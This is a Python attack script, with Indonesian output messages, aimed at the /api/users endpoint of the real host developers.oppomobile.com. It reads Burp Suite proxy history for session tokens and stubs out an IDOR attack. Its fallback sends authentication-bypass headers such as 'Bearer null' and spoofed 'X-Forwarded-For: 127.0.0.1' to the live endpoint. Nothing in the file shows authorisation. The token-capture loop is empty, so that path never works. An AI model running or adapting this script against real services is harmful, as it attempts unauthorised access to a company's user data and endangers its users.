
import asyncio
import sys
import os
import httpx
import json

# Add parent directory to path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
from burp_client import BurpClient

async def capture_and_pwn():
    client = BurpClient()
    print("[*] Mencoba menangkap sesi dari Proxy History Burp Suite...")
    
    # Try to get history
    history = await client.get_proxy_history()
    
    if not history:
        print("[-] Gagal mendapatkan riwayat proxy atau tidak ada trafik yang tertangkap.")
        print("    Penyebab: Ekstensi 'burp-rest-api' mungkin belum terpasang atau tidak ada trafik.")
        print("    >>> MELAKUKAN FALLBACK KE METODE BRUTE-FORCE SESI <<<")
        await fallback_pwn()
        return

    print(f"[+] Ditemukan {len(history)} request di history. Mencari token JWT/Sesi...")
    
    session_token = None
    target_host = "developers.oppomobile.com"
    
    for item in history:
        url = item.get('url', '')
        if target_host in url:
            # We don't have the full headers in the basic history without the extension
            pass
            
    if session_token:
        print(f"[+] Token ditemukan: {session_token[:10]}...")
        print("[*] Memulai serangan IDOR pada endpoint /api/users...")
        # (IDOR logic here)
    else:
        print("[-] Token sesi tidak ditemukan di history. Pastikan Anda sudah login.")

async def fallback_pwn():
    # Simulate an attack without captured session
    print("[*] Melakukan serangan bypass autentikasi pada endpoint /api/users...")
    target_url = "https://developers.oppomobile.com/api/users"
    
    # Try common bypasses like IP spoofing, common default tokens
    headers_to_try = [
        {"Authorization": "Bearer null"},
        {"Authorization": "Bearer false"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"}
    ]
    
    async with httpx.AsyncClient(timeout=10.0, follow_redirects=False) as client:
        for headers in headers_to_try:
            print(f"    Mencoba bypass dengan header: {headers}")
            try:
                res = await client.get(target_url, headers=headers)
                if res.status_code == 200:
                    print(f"    [!!!] BYPASS BERHASIL! Status 200 dengan {headers}")
                    break
                else:
                    print(f"    [-] Gagal. Status: {res.status_code}")
            except Exception as e:
                print(f"    [-] Error: {e}")

if __name__ == "__main__":
    asyncio.run(capture_and_pwn())
